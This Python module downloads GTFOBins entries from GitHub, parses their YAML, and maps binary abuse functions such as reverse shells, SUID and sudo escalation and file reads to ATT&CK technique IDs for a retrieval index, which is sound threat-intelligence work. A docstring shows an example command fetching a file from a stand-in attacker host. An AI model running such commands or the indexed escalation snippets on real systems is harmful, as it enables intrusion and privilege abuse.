"""Download and parse GTFOBins (Unix binaries for privilege escalation) data.

GTFOBins documents Unix binaries that can be exploited for privilege escalation,
file operations, and other security-relevant functions. We map these to ATT&CK
techniques to improve tool-to-technique retrieval (e.g., curl file-download → T1105).

License: GPL-3.0
Source: https://github.com/GTFOBins/GTFOBins.github.io
"""

from dataclasses import dataclass, field
from pathlib import Path
from typing import Any
import re

import httpx
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

# GitHub API URLs for GTFOBins
GTFOBINS_API_BASE = "https://api.github.com/repos/GTFOBins/GTFOBins.github.io/contents"
GTFOBINS_RAW_BASE = "https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master"

# Directory containing GTFOBins markdown files
GTFOBINS_DIR = "_gtfobins"

# Map GTFOBins function categories to ATT&CK techniques
# These mappings are based on the semantic meaning of each function category
# Function names from: https://gtfobins.github.io/
FUNCTION_TO_TECHNIQUE: dict[str, str] = {
    # File Transfer (actual GTFOBins function names)
    "download": "T1105",            # Ingress Tool Transfer
    "upload": "T1048",              # Exfiltration Over Alternative Protocol

    # Command Execution
    "shell": "T1059",               # Command and Scripting Interpreter
    "command": "T1059",             # Command and Scripting Interpreter
    "reverse-shell": "T1059",       # Command and Scripting Interpreter (+ C2)
    "bind-shell": "T1059",          # Command and Scripting Interpreter

    # Privilege Escalation
    "sudo": "T1548.003",            # Abuse Elevation Control Mechanism: Sudo and Sudo Caching
    "suid": "T1548.001",            # Abuse Elevation Control Mechanism: Setuid and Setgid
    "capabilities": "T1548",        # Abuse Elevation Control Mechanism
    "limited-suid": "T1548.001",    # Abuse Elevation Control Mechanism: Setuid and Setgid
    "privilege-escalation": "T1548", # Abuse Elevation Control Mechanism
    "inherit": "T1548",             # Inherit elevated privileges

    # File Operations
    "file-read": "T1005",           # Data from Local System
    "file-write": "T1565.001",      # Data Manipulation: Stored Data Manipulation

    # Library Loading
    "library-load": "T1574.006",    # Hijack Execution Flow: Dynamic Linker Hijacking

    # Legacy names (in case some files use them)
    "file-download": "T1105",       # Ingress Tool Transfer
    "file-upload": "T1048",         # Exfiltration Over Alternative Protocol
    "non-interactive-bind-shell": "T1059",
    "non-interactive-reverse-shell": "T1059",
}


@dataclass
class GTFOBinFunction:
    """A function capability of a GTFOBin."""

    name: str
    examples: list[dict[str, str]] = field(default_factory=list)

    def get_technique(self) -> str | None:
        """Get the ATT&CK technique ID for this function."""
        return FUNCTION_TO_TECHNIQUE.get(self.name)


@dataclass
class GTFOBinsEntry:
    """A GTFOBins entry representing a Unix binary."""

    name: str
    functions: list[GTFOBinFunction] = field(default_factory=list)
    description: str = ""

    def get_techniques(self) -> list[tuple[str, str, str]]:
        """
        Get unique (technique_id, function_name, example_code) tuples.

        Returns:
            List of (technique_id, function_name, example_code) tuples
        """
        techniques = []
        seen = set()

        for func in self.functions:
            technique_id = func.get_technique()
            if technique_id and technique_id not in seen:
                seen.add(technique_id)
                # Get first example code if available
                example_code = ""
                if func.examples and func.examples[0].get("code"):
                    example_code = func.examples[0]["code"]
                techniques.append((technique_id, func.name, example_code))

        return techniques


def _parse_gtfobins_markdown(content: str) -> dict[str, Any]:
    """
    Parse a GTFOBins file.

    GTFOBins files are pure YAML (not markdown with frontmatter).
    They start with --- and end with ... (YAML document markers):

    ---
    functions:
      download:
        - code: |
            curl http://attacker.com/file -o outfile
    ...

    Args:
        content: YAML file content

    Returns:
        Parsed YAML dict or empty dict
    """
    # GTFOBins files are pure YAML, not markdown frontmatter
    # They start with --- and end with ... (YAML document markers)
    try:
        import yaml
        data = yaml.safe_load(content)
        return data if isinstance(data, dict) else {}
    except Exception as e:
        console.print(f"[yellow]YAML parse error: {e}[/yellow]")
        return {}


def _parse_gtfobins_entry(name: str, data: dict[str, Any]) -> GTFOBinsEntry | None:
    """
    Parse GTFOBins frontmatter into a GTFOBinsEntry.

    Args:
        name: Binary name (from filename)
        data: Parsed YAML frontmatter

    Returns:
        GTFOBinsEntry or None if invalid
    """
    if not data:
        return None

    functions_data = data.get("functions", {})
    if not functions_data or not isinstance(functions_data, dict):
        return None

    functions = []
    for func_name, examples in functions_data.items():
        if isinstance(examples, list):
            parsed_examples = []
            for ex in examples:
                if isinstance(ex, dict):
                    parsed_examples.append({
                        "description": ex.get("description", ""),
                        "code": ex.get("code", ""),
                    })
            functions.append(GTFOBinFunction(name=func_name, examples=parsed_examples))

    if not functions:
        return None

    return GTFOBinsEntry(
        name=name,
        functions=functions,
        description=data.get("description", ""),
    )


def download_gtfobins(
    output_dir: Path | str = "data",
    force: bool = False,
) -> Path:
    """
    Download GTFOBins markdown files from GitHub.

    Args:
        output_dir: Directory to save the downloaded files
        force: Re-download even if files exist

    Returns:
        Path to the GTFOBins data directory
    """
    output_dir = Path(output_dir)
    gtfobins_dir = output_dir / "gtfobins"

    # Check if already downloaded
    marker_file = gtfobins_dir / ".downloaded"
    if marker_file.exists() and not force:
        console.print(f"[green]Using cached GTFOBins data:[/green] {gtfobins_dir}")
        return gtfobins_dir

    gtfobins_dir.mkdir(parents=True, exist_ok=True)

    console.print("[blue]Downloading GTFOBins data...[/blue]")

    downloaded = 0
    errors = 0

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.completed}/{task.total}"),
        console=console,
    ) as progress:
        with httpx.Client(timeout=30.0) as client:
            # Get list of files
            task = progress.add_task("Listing GTFOBins...", total=None)
            all_files: list[str] = []

            try:
                api_url = f"{GTFOBINS_API_BASE}/{GTFOBINS_DIR}"
                response = client.get(api_url)
                response.raise_for_status()
                files = response.json()
                for f in files:
                    # GTFOBins files don't have extensions - they're just named after the binary
                    if isinstance(f, dict) and f.get("type") == "file":
                        all_files.append(f["name"])
            except Exception as e:
                console.print(f"[red]Could not list GTFOBins: {e}[/red]")
                return gtfobins_dir

            progress.update(task, completed=1, total=1)

            # Download each file
            if all_files:
                download_task = progress.add_task("Downloading markdown files...", total=len(all_files))

                for filename in all_files:
                    try:
                        raw_url = f"{GTFOBINS_RAW_BASE}/{GTFOBINS_DIR}/{filename}"
                        response = client.get(raw_url)
                        response.raise_for_status()

                        out_file = gtfobins_dir / filename
                        out_file.write_text(response.text)
                        downloaded += 1
                    except Exception as e:
                        console.print(f"[yellow]Failed to download {filename}: {e}[/yellow]")
                        errors += 1

                    progress.update(download_task, advance=1)

    # Write marker file
    marker_file.write_text(f"downloaded={downloaded}, errors={errors}")

    console.print(f"[green]Downloaded {downloaded} GTFOBins files[/green] (errors: {errors})")
    return gtfobins_dir


def parse_gtfobins(gtfobins_dir: Path | str) -> list[GTFOBinsEntry]:
    """
    Parse all GTFOBins markdown files in a directory.

    Args:
        gtfobins_dir: Directory containing GTFOBins markdown files

    Returns:
        List of GTFOBinsEntry objects
    """
    gtfobins_dir = Path(gtfobins_dir)

    if not gtfobins_dir.exists():
        console.print(f"[yellow]GTFOBins directory not found: {gtfobins_dir}[/yellow]")
        return []

    entries = []
    # GTFOBins files don't have extensions - exclude marker files
    all_files = [f for f in gtfobins_dir.iterdir() if f.is_file() and not f.name.startswith(".")]

    console.print(f"[dim]Parsing {len(all_files)} GTFOBins files...[/dim]")

    for gtfobins_file in all_files:
        try:
            # Binary name is the filename (no extension to strip)
            name = gtfobins_file.name
            content = gtfobins_file.read_text()
            data = _parse_gtfobins_markdown(content)
            if data:
                entry = _parse_gtfobins_entry(name, data)
                if entry:
                    entries.append(entry)
        except Exception as e:
            console.print(f"[yellow]Error parsing {gtfobins_file.name}: {e}[/yellow]")

    console.print(f"[green]Parsed {len(entries)} GTFOBins entries[/green]")
    return entries


def gtfobins_to_documents(entries: list[GTFOBinsEntry]) -> list[dict[str, Any]]:
    """
    Convert GTFOBins entries to documents for vector store.

    Each function with an ATT&CK technique mapping becomes a separate document.

    Args:
        entries: List of GTFOBinsEntry objects

    Returns:
        List of document dicts with id, text, and metadata
    """
    documents = []
    seen_ids = set()

    for entry in entries:
        for technique_id, func_name, example_code in entry.get_techniques():
            # Create unique ID for this tool-function-technique pair
            doc_id = f"gtfobins:{entry.name}:{func_name}"

            # Skip duplicates
            if doc_id in seen_ids:
                continue
            seen_ids.add(doc_id)

            # Build searchable text
            text_parts = [
                f"Tool: {entry.name}",
                f"Function: {func_name}",
                f"Technique: {technique_id}",
            ]

            # Add human-readable function description
            func_descriptions = {
                "download": "Download files from remote server",
                "upload": "Upload files to remote server",
                "shell": "Spawn interactive shell",
                "command": "Execute arbitrary commands",
                "reverse-shell": "Spawn reverse shell connection",
                "bind-shell": "Spawn bind shell listener",
                "sudo": "Exploit sudo privileges for escalation",
                "suid": "Exploit SUID bit for privilege escalation",
                "capabilities": "Exploit Linux capabilities",
                "privilege-escalation": "Escalate privileges",
                "inherit": "Inherit elevated privileges",
                "file-read": "Read arbitrary files",
                "file-write": "Write to arbitrary files",
                "library-load": "Load shared library",
                # Legacy names
                "file-download": "Download files from remote server",
                "file-upload": "Upload files to remote server",
            }
            if func_name in func_descriptions:
                text_parts.append(f"Description: {func_descriptions[func_name]}")

            if example_code:
                # Truncate long examples
                code_text = example_code[:500] if len(example_code) > 500 else example_code
                text_parts.append(f"Example: {code_text}")

            documents.append({
                "id": doc_id,
                "text": "\n".join(text_parts),
                "metadata": {
                    "type": "gtfobins",
                    "tool": entry.name,
                    "attack_id": technique_id,
                    "function": func_name,
                    "platform": "Linux",
                },
            })

    console.print(f"[green]Created {len(documents)} GTFOBins documents for embedding[/green]")
    return documents


if __name__ == "__main__":
    # Quick test
    gtfobins_dir = download_gtfobins("data", force=False)
    entries = parse_gtfobins(gtfobins_dir)

    # Show some examples
    for entry in entries[:3]:
        print(f"\n{entry.name}:")
        for technique_id, func_name, code in entry.get_techniques():
            print(f"  - {func_name} → {technique_id}")
            if code:
                print(f"    {code[:60]}...")

    # Test document generation
    docs = gtfobins_to_documents(entries)
    print(f"\nGenerated {len(docs)} documents")
